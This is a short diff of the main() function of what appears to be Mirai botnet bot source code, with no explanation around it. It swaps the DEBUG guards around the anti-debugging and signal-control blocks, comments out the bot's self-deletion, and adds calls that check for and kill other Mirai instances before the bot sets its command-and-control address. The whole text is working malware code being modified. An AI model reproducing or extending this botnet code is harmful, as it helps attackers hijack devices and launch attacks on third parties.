@@ -110,12 +110,12 @@ int main(int argc, char **args)
     int tbl_exec_succ_len;
     int pgid, pings = 0;
 
-#ifndef DEBUG
+#ifdef DEBUG
     sigset_t sigs;
     int wfd;
 
     // Delete self
-    unlink(args[0]);
+    //unlink(args[0]);
 
     // Signal based control flow
     sigemptyset(&sigs);
@@ -157,13 +157,16 @@ int main(int argc, char **args)
         perror("sigaction");
 #endif
 
+    check_and_exit_self();
+    check_and_kill_mirai();
+
     LOCAL_ADDR = util_local_addr();
 
     srv_addr.sin_family = AF_INET;
     srv_addr.sin_addr.s_addr = FAKE_CNC_ADDR;
     srv_addr.sin_port = htons(FAKE_CNC_PORT);
 
-#ifdef DEBUG
+#ifndef DEBUG
     unlock_tbl_if_nodebug(args[0]);
     anti_gdb_entry(0);
 #else
